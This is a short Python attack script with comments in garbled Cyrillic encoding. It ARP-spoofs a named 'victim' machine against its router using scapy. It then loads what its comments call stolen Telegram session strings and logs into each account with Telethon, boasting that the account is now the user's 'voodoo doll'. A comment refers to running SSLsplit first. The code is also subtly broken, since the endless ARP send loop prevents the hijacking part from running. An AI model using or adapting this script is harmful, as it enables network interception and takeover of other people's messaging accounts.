from scapy.all import *  
from telethon import TelegramClient, sync  
from telethon.sessions import StringSession  
import sys  

# –¢–≤–æ–π api_id –∏ api_hash (—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π —á–µ—Ä–µ–∑ my.telegram.org)  
api_id = 1234567  
api_hash = 'deadbeef12345'  

def poison(target_ip, gateway_ip):  
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), loop=1, inter=0.2)  

if __name__ == "__main__":  
    # –ó–∞–ø—É—Å–∫ ARP-—Å–ø—É—Ñ–∏–Ω–≥–∞ (–ø–æ–º–µ–Ω—è–π IP!)  
    poison("192.168.1.100", "192.168.1.1")  # –ñ–µ—Ä—Ç–≤–∞ –∏ —Ä–æ—É—Ç–µ—Ä  

    # –ß—Ç–µ–Ω–∏–µ —É–∫—Ä–∞–¥–µ–Ω–Ω—ã—Ö —Å–µ—Å—Å–∏–π  
    try:  
        with open('sniffed_sessions.txt', 'r') as f:  
            for session_line in f:  
                try:  
                    client = TelegramClient(StringSession(session_line.strip()), api_id, api_hash)  
                    client.start()  
                    print(f"[–£–°–ü–ï–•] –ê–∫–∫–∞—É–Ω—Ç {client.get_me().phone} —Ç–µ–ø–µ—Ä—å —Ç–≤–æ—è –∫—É–∫–ª–∞ –≤—É–¥—É üì±üíÄ")  
                except Exception as e:  
                    print(f"[–ü–†–û–í–ê–õ] –û—à–∏–±–∫–∞: {str(e)}")  
    except FileNotFoundError:  
        print("–ù–µ—Ç —Ñ–∞–π–ª–∞ —Å —Å–µ—Å—Å–∏—è–º–∏! –°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—É—Å—Ç–∏ ARP+SSLsplit!")  
